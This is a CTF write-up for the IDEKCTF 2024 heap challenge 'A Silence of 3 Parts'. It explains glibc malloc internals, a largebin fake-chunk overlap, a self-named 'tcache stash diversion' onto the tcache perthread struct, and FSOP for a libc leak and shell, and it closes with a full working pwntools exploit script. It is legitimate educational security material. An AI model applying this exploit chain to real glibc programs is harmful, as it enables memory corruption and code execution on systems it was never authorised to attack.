---
title: IDEKCTF 2024 - A SILENCE OF 3 PARTS
draft: false
tags:
  - blog
  - heap-exploitation
  - ctf-writeups
date: 19-08-2024
---
___
### A SILENCE OF 3 PARTS <<  IDEKCTF 2024 

##### TOTAL SOLVES : 3

PREVIOUS :: [[POTLUCKCTF-2023]]

IDEKCTF 2024 was a fun ctf with many cool pwn challenges but I kind of got hung up on this one challenge throughout the ctf. I used the trick from the previous post to improve the odds with this challenge - I will re-explain it as I didnt go as much in depth with the other one.

___
#### PREMISE -
There are classic heap challenge functions such as : 

gibberish()? ... nvm 
- malloc()
>	Mallocs nbytes of size almost arbitrary but not something illogical through use of scanf
- free()
 >	Frees the index and sets a flag to 0 indicating chunk has been freed
- zap()
>	A non traditional heap function called zap which sets the lowest byte of fd to NULL of a chunk at whatever index, this can be called only once

PRIMITIVE - 
	A single NULL byte write onto the forward pointer of any freelist in malloc as you can zap a freed chunk

This is a leakless challenge where the only leak you get is by overwriting file structure.

___
#### INTENDED : 

You can check the challenge authors blog for that :D. I probably wouldnt have been able to come up with such an idea as explained here, when it'll be up over here -> [unvariant](https://unvariant.pages.dev/writeups/). Thus I had to come up with something unusual. I think you should go read the actual solution first before the current cause I feel one should always appreciate what the challenge was supposed to be before what it became.

___
#### UNINTENDED / MY APPROACH -

In the description of the challenge the author mentioned that the ASLR brute was not above `8 bits` to which initially my idea was to overwrite the lowest byte of a `tcache` chunk to get an 8 bit brute on an overlap which I could maybe use as a spray of size to reduce it to a 4 bit brute. But it seemed way too unreliable as for fsop also in the method that I knew of we needed another 4 bit brute for our chunk to land on the file structure and for us to get the leaks.

`Honestly i just wanted to improve my odds because my internet is terrible`

Since I have to improve my primitives I looked at the malloc source to see if I can find something useful. 

I noticed how within largebins if you allocate to a largebin of the following format, The chunk with the skiplist is not removed as it is expensive. Thus it proceeds to the next chunk of same size which is removed.

>[!info]-  Linux users can probably skip this note
>umm... if the diagrams look slightly off to you it is because `SKILL ISSUE`, why you using windows or mac ?? `jk` its prolly because of the font your browser uses (0_0);

```
┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       
│ [0x420] │ ─── > │ [0x420] │ ─── > │ [0x430] │       
│         │ < ─── │         │ < ─── │         │       
┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙      
    │                                    ˰
    └────────────────────────────────────┘
                SKIP-LIST

REQUESTS FOR 0x420

┍━━━━━━━━━┑       ┍━━━━━━━━━┑       
│ [0x420] │ ─── > │ [0x430] │       
│         │ < ─── │         │       
┕━━━━━━━━━┙       ┕━━━━━━━━━┙      
    │                  ˰
    └──────────────────┘
         SKIP-LIST
```

This is the piece of code that corresponds to the following action :

```c
 if ((unsigned long) size
			  == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
                            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                      if (bck->fd != fwd)
                        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
```

##### GAINING OVERLAPPING CHUNKS
Here the only check that happens is that of the fd thus we can use this to fake a largebin chunk by setting pointers and crafting a fake chunk. We do obviously have to make a chunk that passes the unlink_chunk function within the src but this just provides us a way to get overlaps.

> Things that are required to be setup are these 
- size field
- prev_size field
- next_size with prev_inuse unset
- next next's prev_inuse as it checks to coalesce
- current's prev_inuse as it checks to coalesce 

You can of course just refer the source and its written there plain and straight.
If we dont use the largebin of this size afterwards we wont also run into much issues regarding the corruption of this linked list. Thus a cool way to get overlapping chunks when you can edit the fd by one byte.

##### HOW DO YOU SET THE POINTERS ?
To set the pointers I used a malloc consolidate of size 0x30 chunks to consolidate the fastbins and coalesce to retain pointers within the smallbin. This gave me a proper link between chunks which is extremely useful for blind challenges like this. I chose size 0x30 because that was the perfect size where I could coalesce the chunks but also overwrite the pointers to point to each of the chunks, This is a really cool technique to just setup pointers.

The current setup resulted in me getting an overlapped largebin chunk. :D 

> [!danger] PART 1 COMPLETE : GET OVERLAPPING CHUNKS

##### BUT WHAT NOW ? 

I was looking at the options on what all could be used as to reduce the brute and remembered the trick from the previous writeup i put out. Since we now have overlapping chunks, we can just directly attack the tcache perthread struct but doing the following.

I call this a smallbin stash diversion I've not seen an attack like this in how2heap or in the internet so :D new technique? idk

Though one technique that uses this concept of stashing is the smallbin stashing unlink attack which works in the latest glibc versions but it uses calloc for getting an unlink to bypass the tcache layer in libc. while this is a primitive that works for when you just malloc this is kind of inspired from that.

```
SUPPOSE THE SMALLBIN LOOKS LIKE THIS BELOW
AFTER TCACHE OF SAME SIZE IS EXHAUSTED AND WE REQUEST A CHUNK

┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     ╤╤╤
│  [0x98] │ ─── > │  [0x98] │ ─── > │  [0x98] │ ─── > │  [0x98] │ ──> │ │
│         │ < ─── │         │ < ─── │         │ < ─── │         │ <── │ │
┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     ╤╤╤

ONE IS RETURNED 
┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     ╤╤╤
│  [0x98] │ ─── > │  [0x98] │ ─── > │  [0x98] │ ──> │ │ 
│         │ < ─── │         │ < ─── │         │ <── │ │
┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     ╤╤╤

REST ARE MOVED INTO TCACHE
╤╤╤      ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑
│ │ -──> │  [0x98] │ ─── > │  [0x98] │ ─── > │  [0x98] │ ──> 0 
│ │      │         │       │         │       │         │
╤╤╤      ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙
```

This is thanks to this piece of code -

```c
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache != NULL && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
```

So the following code doesn't check the links of the linked list thus what we can do is 
Setup the bk pointers to go through whatever region we want to allocate on. 
As long as it forms a closed loop back to the smallbin of the same size we can get an allocation anywhere we want.
Depending on the setup we can pull this off completely leakless also if we rely on placing pointers and partially overwriting it. But of course we are restricted with what size we can do this to.

Eg:

Let us take the same scenario as before -

```
SUPPOSE THE SMALLBIN LOOKS LIKE THIS BELOW
AFTER TCACHE OF SAME SIZE IS EXHAUSTED AND WE REQUEST A CHUNK

╤╤╤     ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     ╤╤╤
│ │ ──> │  [0x98] │ ─── > │  [0x98] │ ─── > │  [0x98] │ ─── > │  [0x98] │ ──> │ │   CHUNKS GETS REMOVED THIS END
│ │ <── │    1    │ < ─── │    2    │ < ─── │    3    │ < ─── │    4    │ <── │ │   4 GETS REMOVED FIRST SINCE FIFO
╤╤╤     ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     ╤╤╤
                                      ⇑⇑⇑⇑⇑⇑           ⇑⇑⇑⇑⇑⇑⇑
                                BUT NOT FROM HERE   LINKS CHECKED HERE    

[+] INITIAL ALLOCATION HAS HAPPENED 


THUS WE CAN MAKE BK AN ARBITRARY ADDRESS THAT STILL CLOSES THE LOOP BACK

                                          │ SMALLBIN WITH                                      
                                          │ control over bk                        
                                          │ fd can be gibberish()
                                             ↓↓↓↓↓↓↓↓↓
╤╤╤     ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     ╤╤╤
│ │ ──> │  [0x98] │ ─── > │  [0x98] │ ─── > │  [0x98] │ ──> │ │ 
│ │ <┐  │    1    │ < ─── │    2    │     ┌─│    3    │ <── │ │
╤╤╤  │  ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     │ ┕━━━━━━━━━┙     ╤╤╤
     │                                    │            ⇑⇑⇑⇑⇑
     │                                    │     STASHING STARTS HERE 
     │                                    │     
     │  ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     │ 
     │  │  [0x98] │ ─── > │  [0x98] │ <───┘
     └─ │    5    │ < ─── │    V    │
        ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     
          ⇑⇑⇑⇑⇑⇑⇑              ┊
    │> CHUNK IN CONTROL        │  
    │> we point it back        └ AREA THAT WE WANT TO CONTROL
    │> to smallbin[0x98]       

[+] STASHING HAS HAPPENED 

THE FAKE SMALLBIN THUS GETS MOVED INTO TCACHE

╤╤╤      ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑
│ │ -──> │  [0x98] │ ─── > │  [0x98] │ ─── > │  [0x98] │ ──> 0 
│ │      │    5    │       │    V    │       │    3    │
╤╤╤      ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙
                                ┊
NOW ALLOCATING THROUGH TCACHE   │
WE GET ALLOCATION HERE  ────────┘

[+] YOU SUCCEEDED IN GETTING THE ALLOCATION

```

###### ___When is this useful ?___
> __if__
- You have a heap pointer at a known address 
- The address in which the pointer lies has the last nibble be 0x8 because we are using it as the bk
- The data at the heap pointer is controlled by user
> __Then__
- You can get an allocation on the heap pointer 

> __NOTE__ : 
- But for leakless challenges due to partial overwrite you are sort of restricted to the heap if there are no other pointers in the heap.
- Unless in cases where there could be residual pointers from previous allocations which you can overwrite to get an allocation through.

This is most useful for circumstances where you want to convert a UAF to an arbitrary write 

##### BUT DO WE HAVE A HEAP ARRAY AT A KNOWN ADDRESS ?

The tcache perthread struct is used to manage the tcache allocations and frees and it is directly within heap unencrypted
we can target the following to get arbitrary writes especially in blind challenges.

So what did I do? since tcache points directly at user-data we can use it to fake a smallbin chunk.
but we need a libc pointer in tcache struct thus I did the same twice, 
1. to write the size on the struct
2. to get allocation so that we can free the chunk and put into unsorted bin to place the libc pointer in the struct.

This can be done completely leakless and with 100% accuracy if you can have 2 chunks within `0x80` bytes from the tcache as tcache itself is of size `0x290` at the start of the libc. 

Thus i chose size 0x28 as it gives me 2 chunks such that I can edit the last byte to reach the tcache struct. 
We need this because editing more than 1 byte would lead to having to deal with aslr and bruting.

>[!danger] PART 2 COMPLETE : TCACHE PERTHREAD STRUCT CORRUPTION

##### DO WE GET A LEAK, ANYTIME SOON ?

You can use fsop to leak the libc addresses within the file structure itself by editing the flags and setting a few pointers to null it has been beautifuly explained by sherl0ck [here](https://vigneshsrao.github.io/posts/babytcache/), Thus I wont be going much into it. This is the part where it required a `4 bit brute` as the aslr address had the 4th nibble from the end be random due to page alignment being 0x1000 bytes.

##### CODE EXECUTION ? 

In glibc 2.39 many code execution paths have been patched so we can mostly only rely on fsop, which is exactly what was done, I used _IO_wdoallocbuf+43 code path for code execution. It is mentioned here in niftic's [blog](https://niftic.ca/posts/fsop/) and referred this [blog](https://faraz.faith/2020-10-13-FSOP-lazynote/) for the structure.

>[!danger] PART 3 COMPLETE : CODE EXECUTION

Thats it for `a silence of 3 parts`

I dont know if this warrants to being a house but if it was I would call it House of pain :) enough with the unfunny jokes then :D

I wanted to blood the challenge but couldn't due to how complicated this exploit got but the challenge was worth solving, felt like I re-explored malloc. I reccomend this, as this is a challenge I've had fun with despite the painfulness of some of the parts of this exploit. I would not have solved this challenge the intended way even If i could have gotten the script done cause of my connection speed which is as slow as a sloth, well at least got a third blood (\`o\`)/.

If you have any queries regarding this or if I missed something or If you just want to talk about pwning I'm  [\_r0r1\_](discordapp.com/users/_r0r1_) in discord. Hopefuly It was worth your time and I at least understood the solve for this challenge. 

___
And that's about it Here is my exploit for the same > 
#### EXPLOIT 

```py
from pwn import *

exe = './chal'

(host,port) = ("a-silence-of-three-parts.chal.idek.team",1337)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    
    elif args.RE:
        return remote(host,port)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

context.terminal = ["gnome-terminal", "--"]

# ====================[EXPANSIONS]=========================

se  = lambda data  : p.send(data)
sl  = lambda data  : p.sendline(data)
sa  = lambda ip,op : p.sendafter(ip,op)
sla = lambda ip,op : p.sendlineafter(ip,op) 
rvu = lambda data  : p.recvuntil(data)
rvl = lambda       : p.recvline()
rv  = lambda nbyt  : p.recv(nbyt)

# >>>>>>>>>>>>>>>>[EXPLOIT STARTS HERE]>>>>>>>>>>>>>>>>>>>>

# context.aslr = False

count = 0
freed = ["" for i in range (0x7f)]

def malloc(cname,size,stuff,norecv=0):
    global count
    sla(b":",b"0")
    sla(b":",str(size).encode())
    sa(b": ",stuff)
    if(norecv != 1):
        rvu(b":")

    i = 0 
    while(freed[i] != ""):
        i += 1
    freed[i] = cname

    count += 1
    print(count)

def free(cname):
    idx = 0 
    while(freed[idx] != cname):
        idx += 1
    
    sla(b":",b"1")
    sla(b":",str(idx).encode())
    
def zap(cname):
    idx = 0 
    while(freed[idx] != cname):
        idx += 1
    
    sla(b":",b"2")
    sla(b":",str(idx).encode())
    
p = start()

# POW
if args.RE:
    rvl()
    rvl()
    rvl()
    rvu("solve ")
    p1 = "python3"
    p2 = rvl().decode()[:-1:]

    proc = [p1,"pow.py","solve",p2]
    print(proc)
    x = subprocess.run(proc, capture_output=True)
    print(x.stdout)

    sl(x.stdout)

# NEW PLAN 
# largebin chunk faking to get waf + tcache stashing unlink or house of water to get libc pointer in tcache_struct + fsop 
# STEP 1 : PULL OF A LARGEBIN SKIP ATTACK ON A FAKE CHUNK AND GET WRITE AFTER FREE
# STEP 2 : DO A TCACHE STASH DIVERSION ATTACK TO GET ALLOCATION OVER TCACHE_STRUCT
# STEP 3 : FREE THE FAKE LARGEBIN CHUNK IN PERTHREAD STRUCT TO GET LEAKS 
# STEP 4 ? : FSOP T-T PAIN

# LARGEBINS [0x420]->[0x430]
# WE CHANGE LINKS FROM THIS TO [0x420]->[0x420 - FAKE]
# FAKE CHUNK RESTRICTIONS = bk->fd = fd and fd->bk = bk
# WHAT A PAIN THO :D WE HAVE TO ALIGN IT TO 0x100 BYTES

for i in range (11):
    if(i > 7):
        malloc(f"B20-{i}",0x18,"BARRIER")
        malloc(f"B20.1-{i}",0x28,"BARRIER")
    malloc(f"T20-{i}",0x28,"BARRIER")
    if(i == 6):
        malloc(f"VICTIM-0",0x18,"BARRIER")

# PLACING POINTER TO LINK THE LARGEBIN
malloc("MC-1",0x420,"CONSOLIDATE")
malloc("T20-11",0x28,"BARRIER")
malloc("T20-12",0x28,"BARRIER")
malloc("T20-13",0x28,"BARRIER")

for i in range (7):
    free(f"T20-{i}")

free("T20-12")
free("T20-9")
free("T20-8")
free("T20-7")

malloc("MC-0",0x420,"CONSOLIDATE")

# CONSOLIDATING FASTBINS TO GET POINTERS IN PLACE
free("B20.1-9")
free("B20.1-8")

# THERE IS SOME FUTURE SETUP HERE WHICH WILL BE REVEALED IN TIME
free("MC-1")
malloc("MC-2",0x420,b"CONSOLIDATE:D YE" + 0xa0*b"\x00" + p64(0x460) + p64(0x3a1) + 
        0x2b0*b"\x00" + 
        p64(0x430) + p64(0xe0))

# WE HAVE SUCCESFULLY fsD A LARGEBIN CHUNK'S TOP
malloc("VICTIM",0x58,0x28*b"a" + p64(0x431) + b"\x80")
malloc("ACCOMPLICE",0x58,0x28*b"a" + p64(0x961))

free("T20-13")
malloc("MC-3",0x420,b"CONSOLIDATE HEHE")
free("MC-3")
free("MC-0")

# BYE LARGEBIN YOU WILL BE MISSED
malloc("MC-4",0x420,b"LARGEBIN SACRIFICE")
malloc("B-1",0x48,b"YOU CANT GO INTO THE WILDERNESS YET")

# BEFORE WE KILL OFF LARGEBINS WE HAVE SOME STUFF TO DO
# WE NEED TO ALLOCATE SOME CHUNKS OF PARTICULAR SIZES 
# SETUP BK POINTERS IN A WAY WHERE IT LEADS BACK TO SMALLBIN
# THIS HAS TO BE SETUP FOR TWO INCOMING STASHING ATTACKS AFTER WHICH WE WILL BECOME AN OVERLORD
# WE NEED A TCACHE CHUNK JUST ABOVE SMALLBIN TO SET UP A POINTER TO IT
# AFTER WHICH WE COALESCE AND SETUP STUFF
# GENERAL LAYOUT [S1]->[S2]->[CHNK_NEAR_STRUCT]->[S3]
# CORRUPTED LAYOUT [S]->[S2]->[PERTHREAD_STRUCT]->[S3]
# S3 CAN BE ANYWHERE BUT IT WILL BE TCACHE OF SIZE 

# SETTING UP SMALLBIN POINTERS FOR TCACHE-STASH DIVERSION ATTACK
# I DONT THINK THIS ATTACK HAS ANY OFFICIAL NAME THOUGH SO ILL JUST CALL IT THAT

# ====================== SETTING UP SMALLBIN POINTERS FOR ATTACK ============================

# SETTING UP ATTACK FOR TCACHE ENTRY 0x328

for i in range (8):
    malloc(f"CACHE-{i}",0x28,b"AAAA")

malloc("T-0",0x450,"HAHA")
malloc("TT-0",0x28,"HAHA")
malloc("TB-0",0x28,"HIHU")

for i in range (7):
    free(f"CACHE-{i}")

# PUTTING CHUNK IN SMALLBIN
free("TT-0")
malloc("T-2",0x440,"HUHU")
free("T-0")
free("TB-0")

# TRIGGERING MALLOC_CONSOLIDATE AGAIN TO COALESCE BACKWARD
malloc("T-3",0x440,"HUHU")
free("T-2")
malloc("STUFF1",0x328,b"SOMETHING")
free("STUFF1")

# ====================== SETTING UP SMALLBIN POINTERS FOR ATTACK? ============================

# THIS IS JUST THE SAME THING REPEAT WITH SOME NAMES CHANGED 
# BUT THIS TIME WE ARE DOING THE SAME FOR TCACHE STRUCT ENTRY 0x348

for i in range (7):
    malloc(f"CACHE2-{i}",0x28,b"AAAA")

malloc("2T-0",0x450,"HAHA")
malloc("2TT-0",0x28,"HAHA")
malloc("2TB-0",0x28,"HIHU")

for i in range (7):
    free(f"CACHE2-{i}")

# PUTTING CHUNK IN SMALLBIN
free("2TT-0")
malloc("2T-2",0x440,"HUHU")
free("2T-0")
free("2TB-0")

# TRIGGERING MALLOC_CONSOLIDATE AGAIN TO COALESCE BACKWARD
malloc("2T-3",0x440,"HUHU")
free("2T-2")
malloc("STUFF2",0x348,b"SOMETHING")
free("STUFF2")

# ======================== SETTING UP THE SMALLBINS TO FREE ================================

for i in range (13):
    malloc(f"SMOB-{i}",0x18,":D")
    malloc(f"SMOL-{i}",0x28,":D")

# SETTING UP 0x28 SMALLBIN

for i in range (9):
    if(i == 6 or i==5):
        continue
    free(f"SMOL-{i}")
    
# ONE NEAR
free("SMOL-6")
# ONE IN CONTROL
free("B20.1-10")
# DED CHUNKS
free("SMOL-0")
free("SMOL-9")
free("SMOL-10")

for i in range (3):
    malloc(f"MAIN{i}",0x338,b"AAAAAAAA")

# [ONE_TO_GET_USED]->[ONE_IN_CONTROL]->[ONE_NEAR_STRUCT]
# THIS IS THE BASIC STRUCTURE OF THE EXPLOIT 
# ONE_NEAR THE STRUCT IS PARTIALLY OVERWRITTEN WITH THE PERTHREAD STRUCT ADDRESS AS WE HAVE WAF
# FIRST WRITE IS PRETTY SIMPLE AS WE CAN SET IT UP A BIT BEFORE BUT SECOND ONE IS TRICKY

# ==================== MARKING WHERE WE KILL OFF LARGEBINS =====================

# SETTING UP LARGEBINS
free("MC-4")
free("MC-2")

# # SHUFFLE AND ZAP OUT LARGEBINS T-T
malloc("SHF-1",0x600,"HELLO")
zap("MC-4")
context.log_level = "DEBUG"

# GAINING OVERLAPPING CHUNKS
malloc("OVERLAP-1",0x428,b"OH MY GAD ('O') OVERLAPPING CHUNKS YEY!!" + 
        p64(0x21) + 0x18*b"a" + 
        p64(0x31) + 0x8*b"a"  + b"\x00"
        )

for i in range (8):
    malloc(f"CACHE3-{i}",0x28,b"AHAHA")

# =================== GOT FIRST ALLOCATION ON TCACHE STRUCT ======================

# GETTING SIZE ALLOCATED ON THE TCACHE PERTHREAD STRUCT 
malloc("CACHE3-8",0x28,b"AHAHA")
malloc("VICTIM-2",0x28,p64(0x0) + p64(0x461) + p64(0x0))

malloc("CACHE3-9",0x28,"HAAHAH")

# FILLING TCACHE
for i in range (6):
    if(i == 2):
        continue
    free(f"CACHE3-{i}")

free("SMOL-11")

# ONE NEAR
free("CACHE3-2")
# ONE IN CONTROL
free("CACHE3-9")
# DED CHUNKS
free("CACHE3-7")
free("CACHE3-9")
free("SMOL-12")

malloc("SH1",0x500,"HELLO")

free("VICTIM")
malloc("VICTIM2",0X58,0x28*b"a" + p64(0xb1))

free("OVERLAP-1")
malloc("MODIFY",0xa8,5*p64(0x0) + p64(0x21) + 0x18*b"a" + 
        p64(0x31) + 0x8*b"a"  + b"\x10")

for i in range (9):
    malloc(f"CACHE4-{i}",0x28,"AAAA")

for i in range (3):
    free(f"MAIN{i}")

# =================== GOT SECOND ALLOCATION ON TCACHE STRUCT ======================

malloc("ZER0",0x28,p64(0x0))
free("ZER0")

malloc("TSP",0x458,b"\xc0\x45")

payload = p64(0xfbad1800) + p64(0x0)*3 + b"\x00"
malloc("FSOPLEAK",0x338,payload,norecv=1)

# ========================== GETTING LIBC LEAK ===================================

libc = u64((rv(6)).ljust(8,b"\x00")) - 0x204644
print("[+] LIBC OBTAINED : ",hex(libc))
rvu(b":")

free("TSP")
malloc("FINAL-0",0x458,p64(libc + 0x2045c0))

# ================================ FSOP =====================================
fp = libc + 0x2045c0
system = libc + 0x58740
wfileoverflow   = libc + 0x202390

# STDOUT 

fs  = b"\x01;sh".ljust(8,b"\x00")   # original _flags & ~_IO_USER_BUF
fs += p64(0x0) * 12                  # _IO_read_ptr to _markers
fs += p64(0x0)                      # _chain
fs += p32(1)                        # _fileno
fs += p32(0)                        # _flags2
fs += p64(0)                        # _old_offset
fs += p16(0)                        # _cur_column
fs += p8(0)                         # _vtable_offset
fs += b'\n'                         # _shortbuf
fs += p32(0)                        # padding 
fs += p64(libc + 0x2049d8)          # _lock
fs += p64(0)                        # _offset
fs += p64(0)                        # _codecvt
fs += p64(fp - 0x10)                # _wide_data
fs += p64(0)                        # _freeres_list
fs += p64(0)                        # _freeres_buf
fs += p64(0)                        #__pad5
fs += p32(0xffffffff)               # _mode
fs += (p32(0x0) + p64(system) + p64(fp + 0x60)).ljust(20,b"\x00") # _unused2
fs += p64(wfileoverflow - 0x38)     # vtable

malloc("FSOPLEAK",0x338,fs,norecv=1)

p.interactive()

```


> [!quote]-
> Anyways New phrack zine dropped go read it byee : D